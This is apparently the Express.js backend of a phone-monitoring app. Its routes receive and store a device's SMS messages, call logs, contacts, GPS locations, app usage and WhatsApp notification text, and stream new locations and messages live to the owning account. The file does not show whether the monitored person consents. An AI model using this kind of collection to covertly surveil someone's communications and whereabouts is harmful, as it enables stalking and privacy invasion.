// routes/data.js (substituir as rotas POST por versões que exigem device registrado/associado)
const express = require('express');
const Sms = require('../models/Sms');
const Call = require('../models/Call');
const Contact = require('../models/Contact');
const Location = require('../models/Location');
const Device = require('../models/Device');
const AppUsage = require('../models/AppUsage');
const Notification = require('../models/Notification'); // novo
const router = express.Router();

// Helper: require device registered & associated to a user
async function requireRegisteredDevice(deviceId) {
  if (!deviceId) throw { status: 400, message: 'deviceId required' };
  const dev = await Device.findOne({ deviceId });
  if (!dev) throw { status: 403, message: 'device not registered' };
  if (!dev.user) throw { status: 403, message: 'device not associated to user' };
  return dev;
}

// POST /api/sms
router.post('/sms', async (req, res) => {
  try {
    const { deviceId, sender, message, timestamp } = req.body;
    const dev = await requireRegisteredDevice(deviceId);
    const doc = new Sms({
      deviceId,
      user: dev.user,
      sender, message, timestamp: timestamp ? new Date(timestamp) : new Date()
    });
    await doc.save();
    res.json({ ok: true });
  } catch (e) {
    console.error('sms err', e);
    const status = e.status || 500;
    return res.status(status).json({ error: e.message || 'server error' });
  }
});

// POST /api/call
router.post('/call', async (req, res) => {
  try {
    const { deviceId, number, type, state, timestamp, duration } = req.body;
    const dev = await requireRegisteredDevice(deviceId);
    const doc = new Call({
      deviceId,
      user: dev.user,
      number, type, state, timestamp: timestamp ? new Date(timestamp) : new Date(),
      duration: duration || 0
    });
    await doc.save();
    res.json({ ok: true, id: doc._id });
  } catch (e) {
    console.error('call err', e);
    const status = e.status || 500;
    return res.status(status).json({ error: e.message || 'server error' });
  }
});

// POST /api/contacts (bulk)
router.post('/contacts', async (req, res) => {
  try {
    const { deviceId, contacts } = req.body;
    const dev = await requireRegisteredDevice(deviceId);
    if (!Array.isArray(contacts)) return res.status(400).json({ error: 'contacts must be array' });
    const userId = dev.user;
    const docs = contacts.map(c => ({ deviceId, user: userId, name: c.name || '', number: c.number || '' }));
    await require('../models/Contact').insertMany(docs);
    res.json({ ok: true, inserted: docs.length });
  } catch (e) {
    console.error('contacts err', e);
    const status = e.status || 500;
    return res.status(status).json({ error: e.message || 'server error' });
  }
});

// POST /api/location
router.post('/location', async (req, res) => {
  try {
    const { deviceId, lat, lon, accuracy, timestamp } = req.body;
    const dev = await requireRegisteredDevice(deviceId);
    const doc = new Location({
      deviceId,
      user: dev.user,
      lat, lon, accuracy: accuracy || 0, timestamp: timestamp ? new Date(timestamp) : new Date()
    });
    await doc.save();

    // emit socket to owning user
    const io = req.app.locals.io;
    if (io && doc.user) {
      io.to(`user:${String(doc.user)}`).emit('location:new', {
        _id: doc._id, deviceId: doc.deviceId, lat: doc.lat, lon: doc.lon, accuracy: doc.accuracy, timestamp: doc.timestamp
      });
    }

    res.json({ ok: true });
  } catch (e) {
    console.error('location err', e);
    const status = e.status || 500;
    return res.status(status).json({ error: e.message || 'server error' });
  }
});

// POST /api/app-usage
router.post('/app-usage', async (req, res) => {
  try {
    const { deviceId, packageName, totalTime, lastTimeUsed } = req.body;
    const dev = await requireRegisteredDevice(deviceId);
    const doc = new AppUsage({
      deviceId,
      user: dev.user,
      packageName, totalTime, lastTimeUsed: lastTimeUsed ? new Date(lastTimeUsed) : new Date()
    });
    await doc.save();
    res.json({ ok: true });
  } catch (e) {
    console.error('app-usage err', e);
    const status = e.status || 500;
    return res.status(status).json({ error: e.message || 'server error' });
  }
});

// POST /api/whatsapp -> now store as Notification
router.post('/whatsapp', async (req, res) => {
  try {
    const { deviceId, message, timestamp, packageName, title } = req.body;
    const dev = await requireRegisteredDevice(deviceId);
    const note = new Notification({
      deviceId,
      user: dev.user,
      packageName: packageName || 'unknown',
      title: title || '',
      message: message || '',
      timestamp: timestamp ? new Date(timestamp) : new Date()
    });
    await note.save();

    const io = req.app.locals.io;
    if (io && note.user) {
      io.to(`user:${String(note.user)}`).emit('notification:new', {
        _id: note._id, packageName: note.packageName, message: note.message, timestamp: note.timestamp, title: note.title
      });
    }

    res.json({ ok: true });
  } catch (e) {
    console.error('whatsapp err', e);
    const status = e.status || 500;
    return res.status(status).json({ error: e.message || 'server error' });
  }
});

module.exports = router;
